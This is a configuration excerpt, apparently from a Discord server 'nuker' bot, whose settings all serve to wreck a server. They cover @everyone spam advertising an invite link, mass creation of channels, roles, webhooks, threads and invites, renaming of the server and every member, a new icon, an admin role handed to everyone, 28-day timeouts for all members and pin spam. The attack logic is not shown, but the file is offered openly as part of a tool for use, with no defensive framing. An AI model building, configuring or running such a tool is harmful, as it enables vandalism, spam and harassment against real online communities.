...
class Config:
    ...
    # ===== MESSAGE SETTINGS =====
    SPAM_MESSAGE = "@everyone @here nuked by cmh https://discord.gg/Nbxh3RSb5T"  # The message that will be spammed in channels
    ...
    # ===== CHANNEL SETTINGS =====
    CHANNEL_NAME = "nukedbycmh"  # Base name for created text channels
    CHANNELS_COUNT = 50  # How many text channels to create
    NEW_CHANNEL_NAME = "nukedbycmh"  # Name pattern when renaming existing channels
    VOICE_CHANNELS_COUNT = 50  # How many voice channels to create
    VOICE_CHANNEL_NAME = "nukedbycmh"  # Base name for created voice channels
    CATEGORY_NAME = "nukedbycmh"  # Base name for created categories
    CATEGORIES_COUNT = 5  # How many categories to create
    THREAD_COUNT = 5  # How many threads to create in each text channel
    THREAD_NAME = "nukedbycmh"  # Base name for created threads
    NSFW_CHANNEL_NAME = "nukedbycmh"  # Base name for NSFW channels
    SLOWMODE_DURATION = 300  # Slowmode duration in seconds for all channels

    # ===== ROLE SETTINGS =====
    ROLE_NAME = "nukedbycmh"  # Base name for created roles
    ROLES_COUNT = 10  # How many roles to create
    NEW_ROLE_NAME = "nukedbycmh"  # Name pattern when renaming existing roles
    ADMIN_ROLE_NAME = "ADMIN"  # Name of the admin role given to everyone

    # ===== SERVER SETTINGS =====
    SERVER_NAME = "NUKED by cmh"  # New name for the server
    SERVER_ICON_URL = "https://cdn.discordapp.com/avatars/1504970327405629710/412741bed819a15399735df0e3a36b33.jpg?size=4096"  # URL of new server icon
    NICKNAME = "NUKEDbycmh"  # New nickname for all members
    TIMEOUT_DURATION = 28  # Timeout duration in days for all members, anything above 28 will not work

    # ===== WEBHOOK SETTINGS =====
    WEBHOOK_NAME = "NUKEDbycmh"  # Base name for created webhooks
    WEBHOOK_COUNT = 20  # How many webhooks to create per channel
    WEBHOOK_RENAME = "NUKEDbycmh"  # Name pattern when renaming webhooks

    # ===== INVITE SETTINGS =====
    INVITE_COUNT = 20  # How many invite links to create per channel

    # ===== PIN SETTINGS =====
    PIN_SPAM_COUNT = 10  # How many random messages to pin in each channel
